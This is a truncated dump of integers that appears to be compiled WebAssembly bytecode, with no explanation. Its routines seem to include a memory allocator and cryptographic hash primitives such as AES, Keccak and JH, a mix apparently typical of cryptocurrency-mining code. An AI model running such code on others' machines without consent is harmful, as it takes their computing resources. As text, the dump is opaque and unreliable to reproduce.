54,2,4,65,164,204,0,65,240,207,0,40,2,0,54,2,0,12,4,11,11,11,32,1,65,152,204,0,40,2,0,73,4,64,65,152,204,0,32,1,54,2,0,11,32,1,32,2,106,33,5,65,200,207,0,33,3,2,64,2,64,3,64,32,3,40,2,0,32,5,70,13,1,32,3,40,2,8,34,3,13,0,65,200,207,0,33,3,11,12,1,11,32,3,40,2,12,65,8,113,4,64,65,200,207,0,33,3,5,32,3,32,1,54,2,0,32,3,65,4,106,34,3,32,3,40,2,0,32,2,106,54,2,0,65,0,32,1,65,8,106,34,2,107,65,7,113,33,3,65,0,32,5,65,8,106,34,7,107,65,7,113,33,9,32,1,32,2,65,7,113,4,127,32,3,5,65,0,11,106,34,8,32,0,106,33,6,32,5,32,7,65,7,113,4,127,32,9,5,65,0,11,106,34,5,32,8,107,32,0,107,33,7,32,8,32,0,65,3,114,54,2,4,2,64,32,4,32,5,70,4,64,65,148,204,0,65,148,204,0,40,2,0,32,7,106,34,0,54,2,0,65,160,204,0,32,6,54,2,0,32,6,32,0,65,1,114,54,2,4,5,65,156,204,0,40,2,0,32,5,70,4,64,65,144,204,0,65,144,204,0,40,2,0,32,7,106,34,0,54,2,0,65,156,204,0,32,6,54,2,0,32,6,32,0,65,1,114,54,2,4,32,6,32,0,106,32,0,54,2,0,12,2,11,32,5,40,2,4,34,0,65,3,113,65,1,70,4,127,32,0,65,120,113,33,9,32,0,65,3,118,33,2,2,64,32,0,65,128,2,73,4,64,32,5,40,2,12,34,0,32,5,40,2,8,34,1,70,4,64,65,136,204,0,65,136,204,0,40,2,0,65,1,32,2,116,65,127,115,113,54,2,0,5,32,1,32,0,54,2,12,32,0,32,1,54,2,8,11,5,32,5,40,2,24,33,4,2,64,32,5,40,2,12,34,0,32,5,70,4,64,32,5,65,16,106,34,1,65,4,106,34,2,40,2,0,34,0,4,64,32,2,33,1,5,32,1,40,2,0,34,0,69,4,64,65,0,33,0,12,3,11,11,3,64,32,0,65,20,106,34,2,40,2,0,34,3,4,64,32,3,33,0,32,2,33,1,12,1,11,32,0,65,16,106,34,2,40,2,0,34,3,4,64,32,3,33,0,32,2,33,1,12,1,11,11,32,1,65,0,54,2,0,5,32,5,40,2,8,34,1,32,0,54,2,12,32,0,32,1,54,2,8,11,11,32,4,69,13,1,2,64,32,5,40,2,28,34,1,65,2,116,65,184,206,0,106,34,2,40,2,0,32,5,70,4,64,32,2,32,0,54,2,0,32,0,13,1,65,140,204,0,65,140,204,0,40,2,0,65,1,32,1,116,65,127,115,113,54,2,0,12,3,5,32,4,65,16,106,32,4,40,2,16,32,5,71,65,2,116,106,32,0,54,2,0,32,0,69,13,3,11,11,32,0,32,4,54,2,24,32,5,65,16,106,34,2,40,2,0,34,1,4,64,32,0,32,1,54,2,16,32,1,32,0,54,2,24,11,32,2,40,2,4,34,1,69,13,1,32,0,32,1,54,2,20,32,1,32,0,54,2,24,11,11,32,5,32,9,106,33,0,32,9,32,7,106,5,32,5,33,0,32,7,11,33,5,32,0,65,4,106,34,0,32,0,40,2,0,65,126,113,54,2,0,32,6,32,5,65,1,114,54,2,4,32,6,32,5,106,32,5,54,2,0,32,5,65,3,118,33,1,32,5,65,128,2,73,4,64,32,1,65,3,116,65,176,204,0,106,33,0,65,136,204,0,40,2,0,34,2,65,1,32,1,116,34,1,113,4,127,32,0,65,8,106,34,2,40,2,0,5,65,136,204,0,32,2,32,1,114,54,2,0,32,0,65,8,106,33,2,32,0,11,33,1,32,2,32,6,54,2,0,32,1,32,6,54,2,12,32,6,32,1,54,2,8,32,6,32,0,54,2,12,12,2,11,2,127,32,5,65,8,118,34,0,4,127,65,31,32,5,65,255,255,255,7,75,13,1,26,32,5,65,14,32,0,32,0,65,128,254,63,106,65,16,118,65,8,113,34,0,116,34,1,65,128,224,31,106,65,16,118,65,4,113,34,2,32,0,114,32,1,32,2,116,34,0,65,128,128,15,106,65,16,118,65,2,113,34,1,114,107,32,0,32,1,116,65,15,118,106,34,0,65,7,106,118,65,1,113,32,0,65,1,116,114,5,65,0,11,11,34,1,65,2,116,65,184,206,0,106,33,0,32,6,32,1,54,2,28,32,6,65,16,106,34,2,65,0,54,2,4,32,2,65,0,54,2,0,65,140,204,0,40,2,0,34,2,65,1,32,1,116,34,3,113,69,4,64,65,140,204,0,32,2,32,3,114,54,2,0,32,0,32,6,54,2,0,32,6,32,0,54,2,24,32,6,32,6,54,2,12,32,6,32,6,54,2,8,12,2,11,32,0,40,2,0,33,0,65,25,32,1,65,1,118,107,33,2,32,5,32,1,65,31,70,4,127,65,0,5,32,2,11,116,33,1,2,64,3,64,32,0,40,2,4,65,120,113,32,5,70,13,1,32,1,65,1,116,33,2,32,0,65,16,106,32,1,65,31,118,65,2,116,106,34,1,40,2,0,34,3,4,64,32,2,33,1,32,3,33,0,12,1,11,11,32,1,32,6,54,2,0,32,6,32,0,54,2,24,32,6,32,6,54,2,12,32,6,32,6,54,2,8,12,2,11,32,0,65,8,106,34,1,40,2,0,34,2,32,6,54,2,12,32,1,32,6,54,2,0,32,6,32,2,54,2,8,32,6,32,0,54,2,12,32,6,65,0,54,2,24,11,11,32,10,36,4,32,8,65,8,106,15,11,11,3,64,2,64,32,3,40,2,0,34,5,32,4,77,4,64,32,5,32,3,40,2,4,106,34,8,32,4,75,13,1,11,32,3,40,2,8,33,3,12,1,11,11,65,0,32,8,65,81,106,34,3,65,8,106,34,5,107,65,7,113,33,7,32,3,32,5,65,7,113,4,127,32,7,5,65,0,11,106,34,3,32,4,65,16,106,34,12,73,4,127,32,4,34,3,5,32,3,11,65,8,106,33,6,32,3,65,24,106,33,5,32,2,65,88,106,33,9,65,0,32,1,65,8,106,34,11,107,65,7,113,33,7,65,160,204,0,32,1,32,11,65,7,113,4,127,32,7,5,65,0,34,7,11,106,34,11,54,2,0,65,148,204,0,32,9,32,7,107,34,7,54,2,0,32,11,32,7,65,1,114,54,2,4,32,1,32,9,106,65,40,54,2,4,65,164,204,0,65,240,207,0,40,2,0,54,2,0,32,3,65,4,106,34,7,65,27,54,2,0,32,6,65,200,207,0,41,2,0,55,2,0,32,6,65,208,207,0,41,2,0,55,2,8,65,200,207,0,32,1,54,2,0,65,204,207,0,32,2,54,2,0,65,212,207,0,65,0,54,2,0,65,208,207,0,32,6,54,2,0,32,5,33,1,3,64,32,1,65,4,106,34,2,65,7,54,2,0,32,1,65,8,106,32,8,73,4,64,32,2,33,1,12,1,11,11,32,3,32,4,71,4,64,32,7,32,7,40,2,0,65,126,113,54,2,0,32,4,32,3,32,4,107,34,7,65,1,114,54,2,4,32,3,32,7,54,2,0,32,7,65,3,118,33,2,32,7,65,128,2,73,4,64,32,2,65,3,116,65,176,204,0,106,33,1,65,136,204,0,40,2,0,34,3,65,1,32,2,116,34,2,113,4,127,32,1,65,8,106,34,3,40,2,0,5,65,136,204,0,32,3,32,2,114,54,2,0,32,1,65,8,106,33,3,32,1,11,33,2,32,3,32,4,54,2,0,32,2,32,4,54,2,12,32,4,32,2,54,2,8,32,4,32,1,54,2,12,12,3,11,32,7,65,8,118,34,1,4,127,32,7,65,255,255,255,7,75,4,127,65,31,5,32,7,65,14,32,1,32,1,65,128,254,63,106,65,16,118,65,8,113,34,1,116,34,2,65,128,224,31,106,65,16,118,65,4,113,34,3,32,1,114,32,2,32,3,116,34,1,65,128,128,15,106,65,16,118,65,2,113,34,2,114,107,32,1,32,2,116,65,15,118,106,34,1,65,7,106,118,65,1,113,32,1,65,1,116,114,11,5,65,0,11,34,2,65,2,116,65,184,206,0,106,33,1,32,4,32,2,54,2,28,32,4,65,0,54,2,20,32,12,65,0,54,2,0,65,140,204,0,40,2,0,34,3,65,1,32,2,116,34,5,113,69,4,64,65,140,204,0,32,3,32,5,114,54,2,0,32,1,32,4,54,2,0,32,4,32,1,54,2,24,32,4,32,4,54,2,12,32,4,32,4,54,2,8,12,3,11,32,1,40,2,0,33,1,65,25,32,2,65,1,118,107,33,3,32,7,32,2,65,31,70,4,127,65,0,5,32,3,11,116,33,2,2,64,3,64,32,1,40,2,4,65,120,113,32,7,70,13,1,32,2,65,1,116,33,3,32,1,65,16,106,32,2,65,31,118,65,2,116,106,34,2,40,2,0,34,5,4,64,32,3,33,2,32,5,33,1,12,1,11,11,32,2,32,4,54,2,0,32,4,32,1,54,2,24,32,4,32,4,54,2,12,32,4,32,4,54,2,8,12,3,11,32,1,65,8,106,34,2,40,2,0,34,3,32,4,54,2,12,32,2,32,4,54,2,0,32,4,32,3,54,2,8,32,4,32,1,54,2,12,32,4,65,0,54,2,24,11,5,65,152,204,0,40,2,0,34,3,69,32,1,32,3,73,114,4,64,65,152,204,0,32,1,54,2,0,11,65,200,207,0,32,1,54,2,0,65,204,207,0,32,2,54,2,0,65,212,207,0,65,0,54,2,0,65,172,204,0,65,224,207,0,40,2,0,54,2,0,65,168,204,0,65,127,54,2,0,65,188,204,0,65,176,204,0,54,2,0,65,184,204,0,65,176,204,0,54,2,0,65,196,204,0,65,184,204,0,54,2,0,65,192,204,0,65,184,204,0,54,2,0,65,204,204,0,65,192,204,0,54,2,0,65,200,204,0,65,192,204,0,54,2,0,65,212,204,0,65,200,204,0,54,2,0,65,208,204,0,65,200,204,0,54,2,0,65,220,204,0,65,208,204,0,54,2,0,65,216,204,0,65,208,204,0,54,2,0,65,228,204,0,65,216,204,0,54,2,0,65,224,204,0,65,216,204,0,54,2,0,65,236,204,0,65,224,204,0,54,2,0,65,232,204,0,65,224,204,0,54,2,0,65,244,204,0,65,232,204,0,54,2,0,65,240,204,0,65,232,204,0,54,2,0,65,252,204,0,65,240,204,0,54,2,0,65,248,204,0,65,240,204,0,54,2,0,65,132,205,0,65,248,204,0,54,2,0,65,128,205,0,65,248,204,0,54,2,0,65,140,205,0,65,128,205,0,54,2,0,65,136,205,0,65,128,205,0,54,2,0,65,148,205,0,65,136,205,0,54,2,0,65,144,205,0,65,136,205,0,54,2,0,65,156,205,0,65,144,205,0,54,2,0,65,152,205,0,65,144,205,0,54,2,0,65,164,205,0,65,152,205,0,54,2,0,65,160,205,0,65,152,205,0,54,2,0,65,172,205,0,65,160,205,0,54,2,0,65,168,205,0,65,160,205,0,54,2,0,65,180,205,0,65,168,205,0,54,2,0,65,176,205,0,65,168,205,0,54,2,0,65,188,205,0,65,176,205,0,54,2,0,65,184,205,0,65,176,205,0,54,2,0,65,196,205,0,65,184,205,0,54,2,0,65,192,205,0,65,184,205,0,54,2,0,65,204,205,0,65,192,205,0,54,2,0,65,200,205,0,65,192,205,0,54,2,0,65,212,205,0,65,200,205,0,54,2,0,65,208,205,0,65,200,205,0,54,2,0,65,220,205,0,65,208,205,0,54,2,0,65,216,205,0,65,208,205,0,54,2,0,65,228,205,0,65,216,205,0,54,2,0,65,224,205,0,65,216,205,0,54,2,0,65,236,205,0,65,224,205,0,54,2,0,65,232,205,0,65,224,205,0,54,2,0,65,244,205,0,65,232,205,0,54,2,0,65,240,205,0,65,232,205,0,54,2,0,65,252,205,0,65,240,205,0,54,2,0,65,248,205,0,65,240,205,0,54,2,0,65,132,206,0,65,248,205,0,54,2,0,65,128,206,0,65,248,205,0,54,2,0,65,140,206,0,65,128,206,0,54,2,0,65,136,206,0,65,128,206,0,54,2,0,65,148,206,0,65,136,206,0,54,2,0,65,144,206,0,65,136,206,0,54,2,0,65,156,206,0,65,144,206,0,54,2,0,65,152,206,0,65,144,206,0,54,2,0,65,164,206,0,65,152,206,0,54,2,0,65,160,206,0,65,152,206,0,54,2,0,65,172,206,0,65,160,206,0,54,2,0,65,168,206,0,65,160,206,0,54,2,0,65,180,206,0,65,168,206,0,54,2,0,65,176,206,0,65,168,206,0,54,2,0,32,2,65,88,106,33,3,65,0,32,1,65,8,106,34,5,107,65,7,113,33,2,65,160,204,0,32,1,32,5,65,7,113,4,127,32,2,5,65,0,34,2,11,106,34,5,54,2,0,65,148,204,0,32,3,32,2,107,34,2,54,2,0,32,5,32,2,65,1,114,54,2,4,32,1,32,3,106,65,40,54,2,4,65,164,204,0,65,240,207,0,40,2,0,54,2,0,11,11,65,148,204,0,40,2,0,34,1,32,0,77,4,64,32,10,36,4,65,0,15,11,65,148,204,0,32,1,32,0,107,34,2,54,2,0,65,160,204,0,65,160,204,0,40,2,0,34,1,32,0,106,34,3,54,2,0,32,3,32,2,65,1,114,54,2,4,32,1,32,0,65,3,114,54,2,4,32,10,36,4,32,1,65,8,106,11,156,2,1,5,127,65,192,0,32,0,65,56,106,34,6,40,2,0,65,3,117,34,3,107,33,4,32,3,4,64,32,2,66,3,136,66,63,131,32,4,173,90,4,64,32,0,65,192,0,106,32,3,106,32,1,32,4,16,11,26,32,0,65,48,106,34,5,40,2,0,65,128,4,106,33,3,32,5,32,3,54,2,0,32,3,69,4,64,32,0,65,52,106,34,3,32,3,40,2,0,65,1,106,54,2,0,11,32,0,32,0,65,192,0,106,16,27,32,1,32,4,106,33,1,65,0,33,3,32,2,32,4,65,3,116,172,125,33,2,11,5,65,0,33,3,11,32,2,66,255,3,86,4,64,32,0,65,48,106,33,4,32,0,65,52,106,33,5,3,64,32,4,32,4,40,2,0,65,128,4,106,34,7,54,2,0,32,7,69,4,64,32,5,32,5,40,2,0,65,1,106,54,2,0,11,32,0,32,1,16,27,32,1,65,192,0,106,33,1,32,2,66,128,124,124,34,2,66,255,3,86,13,0,11,11,32,2,66,0,81,4,64,32,6,65,0,54,2,0,15,11,32,0,65,192,0,106,32,3,106,32,1,32,2,66,3,136,167,16,11,26,32,6,32,2,32,3,65,3,116,173,124,62,2,0,11,226,7,1,15,127,35,4,33,6,35,4,65,16,106,36,4,32,0,40,2,0,34,2,4,64,32,2,40,2,4,34,3,4,64,32,3,16,12,32,0,40,2,0,65,0,54,2,4,32,0,40,2,0,33,2,11,32,2,40,2,12,34,3,4,64,32,3,16,12,32,0,40,2,0,65,0,54,2,12,32,0,40,2,0,33,2,11,32,2,16,12,32,0,65,0,54,2,0,11,65,24,16,16,34,3,4,64,32,3,65,124,106,40,2,0,65,3,113,4,64,32,3,66,0,55,0,0,32,3,66,0,55,0,8,32,3,66,0,55,0,16,11,11,32,0,32,3,54,2,0,32,3,65,32,54,2,0,65,32,16,16,34,2,4,64,32,2,65,124,106,40,2,0,65,3,113,4,64,32,2,66,0,55,0,0,32,2,66,0,55,0,8,32,2,66,0,55,0,16,32,2,66,0,55,0,24,11,11,32,3,32,2,54,2,4,32,2,32,1,41,0,0,55,0,0,32,2,32,1,41,0,8,55,0,8,32,2,32,1,41,0,16,55,0,16,32,2,32,1,41,0,24,55,0,24,32,0,40,2,0,34,2,40,2,0,65,2,118,33,1,32,2,65,20,106,34,4,32,1,54,2,0,32,2,65,16,106,34,7,32,1,65,7,106,34,1,54,2,0,32,2,32,1,65,4,116,34,3,54,2,8,32,3,16,16,34,1,4,64,32,1,65,124,106,40,2,0,65,3,113,4,64,32,1,65,0,32,3,16,14,26,11,11,32,2,32,1,54,2,12,32,1,32,2,40,2,4,32,2,40,2,0,16,11,26,32,4,40,2,0,34,1,32,7,40,2,0,65,2,116,79,4,64,32,6,36,4,15,11,32,6,65,1,106,33,9,32,6,65,2,106,33,11,32,6,65,3,106,33,12,32,1,33,8,3,64,32,6,32,2,40,2,12,34,13,32,1,65,2,116,34,10,65,124,106,106,40,0,0,34,5,54,2,0,32,5,65,8,118,33,14,32,5,65,16,118,33,15,32,5,65,24,118,33,3,32,1,32,8,112,34,16,4,64,32,15,65,255,1,113,33,2,32,14,65,255,1,113,33,7,32,5,65,255,1,113,33,4,32,8,65,6,75,32,16,65,4,70,113,4,64,32,6,32,5,65,4,118,65,15,113,65,4,116,65,240,201,0,106,32,5,65,15,113,106,44,0,0,34,4,58,0,0,32,9,32,5,65,12,118,65,15,113,65,4,116,65,240,201,0,106,32,14,65,15,113,106,44,0,0,34,7,58,0,0,32,11,32,5,65,20,118,65,15,113,65,4,116,65,240,201,0,106,32,15,65,15,113,106,44,0,0,34,2,58,0,0,32,12,32,5,65,28,118,65,4,116,65,240,201,0,106,32,3,65,15,113,106,44,0,0,34,3,58,0,0,11,5,32,6,32,9,65,3,16,31,26,32,6,45,0,0,34,2,65,4,118,65,4,116,65,240,201,0,106,32,2,65,15,113,106,44,0,0,33,4,32,9,32,9,45,0,0,34,2,65,4,118,65,4,116,65,240,201,0,106,32,2,65,15,113,106,44,0,0,34,7,58,0,0,32,11,32,11,45,0,0,34,2,65,4,118,65,4,116,65,240,201,0,106,32,2,65,15,113,106,44,0,0,34,2,58,0,0,32,12,32,5,65,4,118,65,15,113,65,4,116,65,240,201,0,106,32,5,65,15,113,106,44,0,0,34,3,58,0,0,32,6,32,1,32,8,110,65,239,203,0,106,44,0,0,32,4,115,34,4,58,0,0,11,32,13,32,10,106,32,13,32,1,32,8,107,65,2,116,106,44,0,0,32,4,115,58,0,0,32,0,40,2,0,34,4,40,2,12,34,8,32,10,65,1,114,106,32,8,32,1,32,4,40,2,20,107,65,2,116,65,1,114,106,44,0,0,32,7,115,58,0,0,32,0,40,2,0,34,4,40,2,12,34,7,32,10,65,2,114,106,32,7,32,1,32,4,40,2,20,107,65,2,116,65,2,114,106,44,0,0,32,2,115,58,0,0,32,0,40,2,0,34,2,40,2,12,34,4,32,10,65,3,114,106,32,4,32,1,32,2,40,2,20,107,65,2,116,65,3,114,106,44,0,0,32,3,115,58,0,0,32,1,65,1,106,34,1,32,0,40,2,0,34,2,40,2,16,65,2,116,73,4,64,32,2,40,2,20,33,8,12,1,11,11,32,6,36,4,11,156,11,2,27,127,27,126,32,0,65,40,106,33,1,32,0,65,8,106,33,2,32,0,65,16,106,33,3,32,0,65,24,106,33,4,32,0,65,32,106,33,5,32,0,65,208,0,106,34,12,41,3,0,33,30,32,0,65,160,1,106,34,13,41,3,0,33,28,32,0,65,248,0,106,34,14,41,3,0,33,32,32,0,41,3,0,33,29,32,0,65,168,1,106,34,15,41,3,0,33,31,32,0,65,128,1,106,34,16,41,3,0,33,36,32,0,65,216,0,106,34,17,41,3,0,33,41,32,0,65,48,106,34,18,41,3,0,33,42,32,0,65,56,106,34,19,41,3,0,33,43,32,0,65,176,1,106,34,20,41,3,0,33,34,32,0,65,136,1,106,34,21,41,3,0,33,44,32,0,65,224,0,106,34,22,41,3,0,33,45,32,0,65,192,0,106,34,23,41,3,0,33,46,32,0,65,184,1,106,34,6,41,3,0,33,33,32,0,65,144,1,106,34,24,41,3,0,33,47,32,0,65,232,0,106,34,25,41,3,0,33,48,32,0,65,200,0,106,34,26,41,3,0,33,49,32,0,65,192,1,106,34,7,41,3,0,33,35,32,0,65,152,1,106,34,8,41,3,0,33,39,32,0,65,240,0,106,34,9,41,3,0,33,40,3,64,32,28,32,30,133,32,32,133,32,29,133,32,1,41,3,0,34,51,133,33,37,32,34,32,43,133,32,44,133,32,45,133,32,3,41,3,0,34,52,133,33,38,32,33,32,46,133,32,47,133,32,48,133,32,4,41,3,0,34,53,133,33,50,32,0,32,35,32,49,133,32,39,133,32,40,133,32,5,41,3,0,34,40,133,34,35,32,36,32,31,133,32,41,133,32,2,41,3,0,34,54,133,32,42,133,34,39,66,1,134,32,39,66,63,136,132,133,34,33,32,29,133,55,3,0,32,1,32,33,32,51,133,55,3,0,32,12,32,33,32,30,133,55,3,0,32,14,32,33,32,32,133,55,3,0,32,13,32,33,32,28,133,55,3,0,32,2,32,38,66,1,134,32,38,66,63,136,132,32,37,133,34,28,32,54,133,34,30,55,3,0,32,18,32,28,32,42,133,55,3,0,32,17,32,28,32,41,133,55,3,0,32,16,32,28,32,36,133,55,3,0,32,15,32,28,32,31,133,55,3,0,32,3,32,50,66,1,134,32,50,66,63,136,132,32,39,133,34,28,32,52,133,55,3,0,32,19,32,28,32,43,133,55,3,0,32,22,32,28,32,45,133,55,3,0,32,21,32,28,32,44,133,55,3,0,32,20,32,28,32,34,133,55,3,0,32,4,32,35,66,1,134,32,35,66,63,136,132,32,38,133,34,28,32,53,133,55,3,0,32,23,32,28,32,46,133,55,3,0,32,25,32,48,32,28,133,55,3,0,32,24,32,47,32,28,133,55,3,0,32,6,32,6,41,3,0,32,28,133,55,3,0,32,5,32,50,32,37,66,1,134,32,37,66,63,136,132,133,34,28,32,40,133,55,3,0,32,26,32,28,32,49,133,55,3,0,32,9,32,9,41,3,0,32,28,133,55,3,0,32,8,32,8,41,3,0,32,28,133,55,3,0,32,7,32,7,41,3,0,32,28,133,55,3,0,65,0,33,10,3,64,32,0,32,10,65,2,116,65,176,59,106,40,2,0,65,3,116,106,34,27,41,3,0,33,28,32,27,32,30,65,192,0,32,10,65,2,116,65,208,58,106,40,2,0,34,27,107,173,136,32,30,32,27,173,134,132,55,3,0,32,10,65,1,106,34,10,65,24,71,4,64,32,28,33,30,12,1,11,11,32,4,41,3,0,33,30,32,5,41,3,0,33,28,32,0,32,3,41,3,0,34,32,32,2,41,3,0,34,29,66,127,133,131,32,0,41,3,0,34,31,133,55,3,0,32,2,32,30,32,32,66,127,133,131,32,29,133,55,3,0,32,3,32,28,32,30,66,127,133,131,32,32,133,55,3,0,32,4,32,31,32,28,66,127,133,131,32,30,133,55,3,0,32,5,32,28,32,29,32,31,66,127,133,131,133,55,3,0,32,23,41,3,0,33,30,32,26,41,3,0,33,28,32,1,32,19,41,3,0,34,32,32,18,41,3,0,34,29,66,127,133,131,32,1,41,3,0,34,31,133,55,3,0,32,18,32,30,32,32,66,127,133,131,32,29,133,34,42,55,3,0,32,19,32,28,32,30,66,127,133,131,32,32,133,34,43,55,3,0,32,23,32,31,32,28,66,127,133,131,32,30,133,34,46,55,3,0,32,26,32,28,32,29,32,31,66,127,133,131,133,34,49,55,3,0,32,25,41,3,0,33,28,32,9,41,3,0,33,32,32,12,32,22,41,3,0,34,29,32,17,41,3,0,34,31,66,127,133,131,32,12,41,3,0,34,36,133,34,30,55,3,0,32,17,32,28,32,29,66,127,133,131,32,31,133,34,41,55,3,0,32,22,32,32,32,28,66,127,133,131,32,29,133,34,45,55,3,0,32,25,32,36,32,32,66,127,133,131,32,28,133,34,48,55,3,0,32,9,32,32,32,31,32,36,66,127,133,131,133,34,40,55,3,0,32,24,41,3,0,33,28,32,8,41,3,0,33,29,32,14,32,21,41,3,0,34,31,32,16,41,3,0,34,34,66,127,133,131,32,14,41,3,0,34,33,133,34,32,55,3,0,32,16,32,28,32,31,66,127,133,131,32,34,133,34,36,55,3,0,32,21,32,29,32,28,66,127,133,131,32,31,133,34,44,55,3,0,32,24,32,33,32,29,66,127,133,131,32,28,133,34,47,55,3,0,32,8,32,29,32,34,32,33,66,127,133,131,133,34,39,55,3,0,32,6,41,3,0,33,29,32,7,41,3,0,33,35,32,13,32,20,41,3,0,34,34,32,15,41,3,0,34,37,66,127,133,131,32,13,41,3,0,34,38,133,34,28,55,3,0,32,15,32,29,32,34,66,127,133,131,32,37,133,34,31,55,3,0,32,20,32,35,32,29,66,127,133,131,32,34,133,34,34,55,3,0,32,6,32,38,32,35,66,127,133,131,32,29,133,34,33,55,3,0,32,7,32,35,32,37,32,38,66,127,133,131,133,34,35,55,3,0,32,0,32,0,41,3,0,32,11,65,3,116,65,128,40,106,41,3,0,133,34,29,55,3,0,32,11,65,1,106,34,11,65,24,71,13,0,11,11,180,2,1,4,127,32,1,32,0,40,2,0,34,6,65,255,1,113,65,2,116,40,2,128,8,32,2,40,2,0,115,32,0,40,2,4,34,3,65,8,118,65,255,1,113,65,2,116,40,2,128,16,115,32,0,40,2,8,34,4,65,16,118,65,255,1,113,65,2,116,40,2,128,24,115,32,0,40,2,12,34,5,65,24,118,65,2,116,40,2,128,32,115,54,2,0,32,1,32,3,65,255,1,113,65,2,116,40,2,128,8,32,2,40,2,4,115,32,4,65,8,118,65,255,1,113,65,2,116,40,2,128,16,115,32,5,65,16,118,65,255,1,113,65,2,116,40,2,128,24,115,32,6,65,24,118,65,2,116,40,2,128,32,115,54,2,4,32,1,32,4,65,255,1,113,65,2,116,40,2,128,8,32,2,40,2,8,115,32,5,65,8,118,65,255,1,113,65,2,116,40,2,128,16,115,32,6,65,16,118,65,255,1,113,65,2,116,40,2,128,24,115,32,3,65,24,118,65,2,116,40,2,128,32,115,54,2,8,32,1,32,5,65,255,1,113,65,2,116,40,2,128,8,32,2,40,2,12,115,32,6,65,8,118,65,255,1,113,65,2,116,40,2,128,16,115,32,3,65,16,118,65,255,1,113,65,2,116,40,2,128,24,115,32,4,65,24,118,65,2,116,40,2,128,32,115,54,2,12,11,6,0,65,0,16,0,11,200,43,2,24,127,40,126,32,0,65,32,106,34,1,41,3,0,32,0,65,160,1,106,34,9,41,3,0,133,33,28,32,1,32,28,55,3,0,32,0,65,40,106,34,2,41,3,0,32,0,65,168,1,106,34,10,41,3,0,133,33,25,32,2,32,25,55,3,0,32,0,65,48,106,34,3,41,3,0,32,0,65,176,1,106,34,11,41,3,0,133,33,30,32,3,32,30,55,3,0,32,0,65,56,106,34,4,41,3,0,32,0,65,184,1,106,34,12,41,3,0,133,33,32,32,4,32,32,55,3,0,32,0,65,192,0,106,34,5,41,3,0,32,0,65,192,1,106,34,13,41,3,0,133,33,33,32,5,32,33,55,3,0,32,0,65,200,0,106,34,6,41,3,0,32,0,65,200,1,106,34,14,41,3,0,133,33,34,32,6,32,34,55,3,0,32,0,65,208,0,106,34,7,41,3,0,32,0,65,208,1,106,34,15,41,3,0,133,33,26,32,7,32,26,55,3,0,32,0,65,216,0,106,34,8,41,3,0,32,0,65,216,1,106,34,16,41,3,0,133,33,31,32,8,32,31,55,3,0,32,0,65,136,1,106,34,17,41,3,0,33,38,32,0,65,152,1,106,34,18,41,3,0,33,41,32,0,65,232,0,106,34,19,41,3,0,33,27,32,0,65,248,0,106,34,20,41,3,0,33,37,32,0,65,128,1,106,34,21,41,3,0,33,42,32,0,65,144,1,106,34,22,41,3,0,33,39,32,0,65,224,0,106,34,23,41,3,0,33,29,32,0,65,240,0,106,34,24,41,3,0,33,35,3,64,32,60,167,34,0,65,5,116,65,176,63,106,41,0,0,34,43,32,29,66,127,133,131,32,28,133,33,36,32,0,65,5,116,65,192,63,106,41,0,0,34,28,32,35,66,127,133,131,32,30,133,34,30,32,26,131,32,28,133,33,45,32,36,32,29,32,42,66,127,133,34,28,131,133,34,40,32,29,131,32,33,133,34,44,32,29,32,33,66,127,133,131,34,47,32,28,133,34,50,132,32,40,133,34,28,32,36,32,33,131,32,43,133,34,52,131,32,44,133,34,53,32,30,32,35,32,39,66,127,133,34,33,131,133,34,36,32,35,131,32,26,133,34,43,32,35,32,26,66,127,133,131,34,26,32,33,133,34,54,132,32,36,133,34,55,133,33,33,32,34,32,25,32,0,65,5,116,65,184,63,106,41,0,0,34,25,32,27,66,127,133,131,133,34,30,131,32,25,133,33,48,32,31,32,32,32,0,65,5,116,65,200,63,106,41,0,0,34,25,32,37,66,127,133,131,133,34,32,131,32,25,133,33,49,32,30,32,27,32,38,66,127,133,34,30,131,133,33,25,32,32,32,37,32,41,66,127,133,34,51,131,133,33,32,32,27,32,34,66,127,133,131,34,56,32,30,133,34,57,32,34,32,25,32,27,131,133,34,46,132,32,25,133,34,30,32,48,131,32,46,133,34,58,32,37,32,31,66,127,133,131,34,59,32,51,133,34,61,32,32,32,37,131,32,31,133,34,51,132,32,32,133,34,62,133,33,34,32,36,32,39,32,26,133,131,32,35,133,34,31,32,45,133,32,28,133,32,40,32,47,32,42,133,131,32,29,133,34,29,32,44,131,32,50,133,34,40,133,34,26,32,53,133,34,35,32,29,32,52,133,34,39,32,43,133,32,55,32,45,131,133,34,29,32,28,133,32,60,66,1,124,167,34,0,65,5,116,65,176,63,106,41,0,0,34,36,32,28,32,54,133,32,31,32,43,131,133,34,42,32,39,133,32,33,133,34,31,66,127,133,131,133,34,28,131,32,36,133,33,39,32,29,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,29,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,36,32,33,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,33,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,32,0,65,5,116,65,192,63,106,41,0,0,34,29,32,26,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,26,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,26,66,127,133,131,133,34,44,131,32,29,133,33,45,32,28,32,31,32,33,32,40,133,34,43,66,127,133,34,33,131,133,33,28,32,44,32,26,32,42,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,42,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,47,66,127,133,34,40,131,133,33,29,32,31,32,35,66,127,133,131,34,50,32,33,133,34,52,32,35,32,28,32,31,131,133,34,42,132,32,28,133,34,35,32,39,131,32,42,133,34,53,32,26,32,36,66,127,133,131,34,54,32,40,133,34,55,32,29,32,26,131,32,36,133,34,36,132,32,29,133,34,63,133,33,33,32,30,32,49,133,32,59,32,41,133,32,32,131,32,37,133,34,41,133,32,56,32,38,133,32,25,131,32,27,133,34,25,32,46,131,32,57,133,34,46,133,34,32,32,58,133,34,37,32,25,32,48,133,34,25,32,51,133,32,62,32,49,131,133,34,27,32,30,133,32,0,65,5,116,65,184,63,106,41,0,0,34,40,32,34,32,25,133,32,30,32,61,133,32,41,32,51,131,133,34,38,133,34,25,66,127,133,131,133,34,30,131,32,40,133,33,41,32,27,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,27,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,34,40,32,34,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,34,66,1,136,66,213,170,213,170,213,170,213,170,213,0,131,132,32,0,65,5,116,65,200,63,106,41,0,0,34,27,32,32,66,1,134,66,170,213,170,213,170,213,170,213,170,127,131,32,32,66,1,136,66,213,170,213,170,213,170,213,